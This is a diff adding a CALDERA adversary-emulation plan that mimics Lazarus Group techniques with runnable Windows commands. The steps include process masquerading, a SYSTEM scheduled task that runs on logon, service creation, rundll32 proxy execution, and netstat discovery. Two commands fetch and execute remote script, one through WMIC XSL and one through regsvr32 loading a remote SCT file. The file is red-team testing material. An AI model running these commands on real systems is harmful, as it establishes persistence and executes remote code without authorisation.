@@ -1,0 +1,173 @@
+# Lazarus.yaml - CALDERA Emulation Plan Format
+
+- emulation_plan_details:
+    id: d6215328-94ef-4b47-b8f2-8c9e6e14713a
+    adversary_name: Lazarus_Emulation
+    adversary_description: Emulation of a Lazarus Group attack graph based on AttackIQ intelligence. Employs Masquerading, Scheduled Tasks (HPSync), XSL Script Processing, Windows Service creation, Rundll32, Regsvr32 execution, and Network Connection Discovery.
+    attack_version: 8.1
+    format_version: 1.0
+
+# Scenario 1 - Lazarus Group Emulation
+
+# Step 1 - Defense Evasion and Persistence
+
+- id: c89e24f1-678a-4d73-8201-987d6e4b9a30
+  name: Masquerading - wmic.exe as ncv.exe
+  description: Copy wmic.exe to a temp directory as ncv.exe to evade detection based on process name.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1036.005
+    name: "Masquerading: Match Legitimate Name or Location"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_defense_evasion
+  procedure_step: "1.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          $dir = Join-Path $env:TEMP "T1036_005_test"
+          New-Item -ItemType Directory -Force -Path $dir | Out-Null
+          $source = "$env:SystemRoot\System32\wbem\wmic.exe"
+          $target = "$dir\ncv.exe"
+          Copy-Item -Path $source -Destination $target -Force
+          & $target os get Caption,Version
+
+  executors:
+  - name: powershell
+    command: |
+      $dir = Join-Path $env:TEMP "T1036_005_test"
+      New-Item -ItemType Directory -Force -Path $dir | Out-Null
+      $source = "$env:SystemRoot\System32\wbem\wmic.exe"
+      $target = "$dir\ncv.exe"
+      Copy-Item -Path $source -Destination $target -Force
+      & $target os get Caption,Version
+
+- id: 42a9b3d7-8e6f-412c-9a4f-5573428c0b11
+  name: Scheduled Task - HPSync
+  description: Create a scheduled task named HPSync that triggers on logon to establish persistence.
+  tactic: persistence
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_persistence
+  procedure_step: "1.B"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          schtasks /create /tn "HPSync" /tr "cmd.exe /c echo Lazarus_Emulation_Task_Triggered" /sc onlogon /ru System /f
+
+  executors:
+  - name: command_prompt
+    command: |
+      schtasks /create /tn "HPSync" /tr "cmd.exe /c echo Lazarus_Emulation_Task_Triggered" /sc onlogon /ru System /f
+
+- id: 714d691e-3b2a-485c-a189-23ef6d9b4c85
+  name: XSL Script Processing via WMIC
+  description: Execute arbitrary XSL script hosted remotely via WMIC.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1220
+    name: "XSL Script Processing"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_defense_evasion
+  procedure_step: "1.C"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          wmic os get /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
+
+  executors:
+  - name: command_prompt
+    command: |
+      wmic os get /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
+
+- id: a92f8b54-93c6-47e1-884b-01649dc2fa7b
+  name: Create Windows Service via sc
+  description: Establish persistence by creating and starting a new Windows service.
+  tactic: persistence
+  technique:
+    attack_id: T1543.003
+    name: "Create or Modify System Process: Windows Service"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_persistence
+  procedure_step: "1.D"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          sc create "LazarusTestSvc" binPath= "C:\Windows\System32\svchost.exe -k netsvcs" start= auto
+          sc start "LazarusTestSvc"
+
+  executors:
+  - name: command_prompt
+    command: |
+          sc create "LazarusTestSvc" binPath= "C:\Windows\System32\svchost.exe -k netsvcs" start= auto
+          sc start "LazarusTestSvc"
+
+# Step 2 - Proxy Execution and Discovery
+
+- id: eb38971f-4c5d-4a1e-b873-195c6a2b8470
+  name: Execute DLL via Rundll32
+  description: Use rundll32.exe to execute a specific entry point of a DLL.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.011
+    name: "System Binary Proxy Execution: Rundll32"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_defense_evasion
+  procedure_step: "2.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          rundll32.exe C:\Windows\System32\syssetup.dll,SetupOobeBnk
+
+  executors:
+  - name: command_prompt
+    command: |
+      rundll32.exe C:\Windows\System32\syssetup.dll,SetupOobeBnk
+
+- id: 5c7e14a2-7b8c-4e9f-91a3-83bd521e4f9d
+  name: Execute COM DLL via Regsvr32
+  description: Use regsvr32.exe to silently execute a remote SCT file bypassing application control.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.010
+    name: "System Binary Proxy Execution: Regsvr32"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_defense_evasion
+  procedure_step: "2.B"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
+
+  executors:
+  - name: command_prompt
+    command: |
+      regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
+
+- id: 2d8f9e6b-1a5c-438d-8b9a-674e2c1b50f3
+  name: System Network Connections Discovery
+  description: Execute netstat via cmd to discover active network connections and listening ports.
+  tactic: discovery
+  technique:
+    attack_id: T1049
+    name: "System Network Connections Discovery"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_discovery
+  procedure_step: "2.C"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          netstat -ano
+
+  executors:
+  - name: command_prompt
+    command: |
+      netstat -ano
